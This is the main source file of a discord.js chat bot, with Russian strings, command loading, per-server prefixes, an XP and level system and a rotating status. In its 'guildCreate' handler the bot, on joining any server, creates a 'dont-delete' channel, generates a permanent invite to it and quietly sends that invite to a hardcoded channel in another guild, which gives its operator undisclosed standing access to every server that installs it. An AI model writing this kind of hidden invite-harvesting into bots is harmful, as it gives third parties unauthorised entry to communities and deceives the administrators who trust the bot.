const Discord = require('discord.js');
const bot = new Discord.Client();
const fs = require("fs");
const ms = require("ms");
const ytdl = require('ytdl-core');
const xp = require("./xp.json");
const prefixs = require("./prefix.json");
var answers = [
    "DydleBoat | db!help",
    `DydleBoat | bit.ly/protectori`
  ] 
bot.commands = new Discord.Collection();
fs.readdir("./commands", (err, files) => {
    if(err) console.log(err);

    let jsfile = files.filter(f => f.split(".").pop() === "js")
    if(jsfile.length <= 0){
        console.log("Не могу найти команды!");
        return;
    }

    jsfile.forEach((f, i) =>{
    let props = require(`./commands/${f}`);
    console.log(`${f} loaded!`);
    bot.commands.set(props.help.name, props);
    });

});

bot.login(process.env.TOKEN);


//PREFIX SET
bot.on('message', async message => {
if(!prefixs[message.guild.id]){
    prefixs[message.guild.id] = {
prefix: 'db!'
    };
}
});
//PREFIX SET




//New server
bot.on('guildCreate', async guild => {
    const invc = await guild.createChannel('dont-delete', 'text');
    bot.guilds.get(guild.id).channels.get(invc.id).createInvite({maxAge:"0"}).then(i => bot.guilds.get('522485574901170197').channels.get('523184795027767314').send('https://discord.gg/'+i.code));
})
//New server




bot.on('message', async message => {
    if(message.author.bot) return;
  let prefix = prefixs[message.guild.id].prefix;
    let messageArray = message.content.split(" ");
    let cmd = messageArray[0];
    let args = messageArray.slice(1);
if(message.content.startsWith(prefix)){
let commandfile = bot.commands.get(cmd.slice(prefix.length));
if(commandfile) commandfile.run(bot,message,args);
}else{ }
});


//XP SYSTEM OPEN
bot.on('message', async message => {
    if(message.author.bot) return;
  let prefix = prefixs[message.guild.id].prefix;
let xpAdd = Math.floor(Math.random() * 7) + 8;

if(!xp[message.author.id]){
    xp[message.author.id] = {
        xp: 0,
        level: 1
    };
}

let curxp = xp[message.author.id].xp;
let curlvl = xp[message.author.id].level;
let nxtLvl = xp[message.author.id].level * 700;
xp[message.author.id].xp = curxp + xpAdd;
if(nxtLvl <= xp[message.author.id].xp){
    xp[message.author.id].level = curlvl + 1;
    let lvlup = new Discord.RichEmbed()
    .setTitle(`${message.author.username} у вас новый уровень!`)
    .setThumbnail(message.author.displayAvatarURL)
    .addField(`Ваш уровень`, curlvl + 1)
    .setColor('00ff54');
    message.channel.send(lvlup);
}
fs.writeFile("./xp.json", JSON.stringify(xp), (err) => {
    if(err) console.log(err)
});
});
//XP SYSTEM END


bot.on('ready', () => {
let interval = setInterval (function () {
    var randomAnswer = answers[Math.floor(Math.random() * answers.length)];
    bot.user.setPresence({
        game:{
            name:`${randomAnswer}`,
            type:"STREAMING",
            url:"https://www.twitch.tv/mcartyr"
        }
    });
      }, 5 * 1000);
  console.log('Я готов')
});
bot.on('messageUpdate', async (oldMessage, message) => {
  if(message.author.bot) return;
  let prefix = prefixs[message.guild.id].prefix;
  let messageArray = message.content.split(" ");
  let cmd = messageArray[0];
  let args = messageArray.slice(1);
if(message.content.startsWith(prefix)){
let commandfile = bot.commands.get(cmd.slice(prefix.length));
if(commandfile) commandfile.run(bot,message,args);
}else{}
  });
